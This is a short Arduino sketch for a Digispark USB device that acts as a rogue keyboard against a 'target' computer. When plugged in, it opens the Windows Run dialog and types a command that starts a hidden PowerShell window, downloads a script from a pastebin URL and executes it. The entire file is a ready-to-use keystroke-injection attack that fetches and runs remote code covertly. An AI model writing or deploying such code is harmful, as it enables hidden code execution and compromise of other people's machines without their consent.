// Change the keyboard layout to that of your target
#define keyboardlayout_fr

// Import CustomDigiKeyboard library
#include "CustomDigiKeyboard.h"

// Change to your script url
#define scriptUrl "https://pastebin.com/raw/45EcCHPd"

void setup() {
  // Initialize the digital pin as an output
  pinMode(1, OUTPUT);
  // Reset KeyStroke
  DigiKeyboard.sendKeyStroke(0);
}

void loop() {
  // Turn the LED on while program is running
  digitalWrite(1, HIGH);

  // Type Windows + R (Run a command)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  // Wait
  DigiKeyboard.delay(200);
  // Execute script in hidden powershell
  DigiKeyboard.print("powershell -windowstyle hidden IEX(wget " scriptUrl ")\n");
  
  // Turn the LED off
  digitalWrite(1, LOW);
  // End of program
  while(1);
}
